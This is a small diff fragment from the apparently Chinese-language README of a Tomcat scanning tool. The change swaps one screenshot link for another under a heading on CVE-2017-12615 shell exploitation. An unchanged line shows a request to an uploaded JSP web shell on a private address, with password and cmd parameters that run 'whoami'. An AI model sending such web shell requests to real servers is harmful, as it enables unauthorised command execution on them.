@@ -22,5 +22,5 @@ https://192.168.1.1        ##检测80端口和443端口，同时检测8009端口
 
 
 cve-2017-12615 shell利用：访问并执行命令
-https://github.com/einzbernnn/Tomcatscan/blob/main/img/1.png
+https://github.com/einzbernnn/Tomcatscan/blob/main/img/2.png
 http://192.168.3.137:8080/1635405387.jsp?&pwd=023&cmd=whoami
